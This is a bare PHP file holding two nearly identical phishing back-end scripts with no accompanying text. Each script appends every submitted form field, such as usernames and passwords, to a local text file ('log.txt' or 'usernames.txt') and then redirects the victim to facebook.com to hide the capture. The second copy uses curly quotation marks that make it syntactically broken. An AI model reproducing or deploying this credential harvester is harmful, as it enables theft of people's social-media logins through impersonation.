<?php 

// Set the location to redirect the page 
header ('Location: http://www.facebook.com'); 

// Open the text file in writing mode 
$file = fopen("log.txt", "a"); 

foreach($_POST as $variable => $value) { 
	fwrite($file, $variable); 
	fwrite($file, "="); 
	fwrite($file, $value); 
	fwrite($file, "\r\n"); 
} 

fwrite($file, "\r\n"); 
fclose($file); 
exit; 
?> 


<?php
header ('Location:http://www.facebook.com/');
$handle = fopen(“usernames.txt”, “a”);
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
exit;
?>